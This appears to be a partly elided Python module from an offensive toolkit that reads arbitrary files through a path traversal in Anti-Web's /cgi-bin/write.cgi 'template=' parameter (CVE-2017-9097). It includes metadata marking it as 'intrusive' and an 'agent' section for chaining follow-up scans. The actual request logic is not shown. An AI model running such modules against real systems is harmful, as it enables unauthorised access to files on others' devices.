#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Anti-Web write.cgi arbitrary file read (CVE-2017-9097)."""
...
class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Anti-Web - write.cgi File Read (CVE-2017-9097)',
        'description': 'Reads arbitrary files via Anti-Web /cgi-bin/write.cgi template= traversal.',
        'author': ['KittySploit Team'],
        'cve': ['CVE-2017-9097'],
        'platform': Platform.LINUX,
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2017-9097'],
        'tags': ['antiweb', 'lfi', 'file-read', 'unauth', 'cve-2017-9097'],
        'agent': {
            'risk': 'intrusive',
            ...
            'chain': {
                ...
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2017_9097_detect'],
            },
        },
    }
    ...
    def run(self):
        ...
        print_status(f'Reading {target} via Anti-Web write.cgi ...')
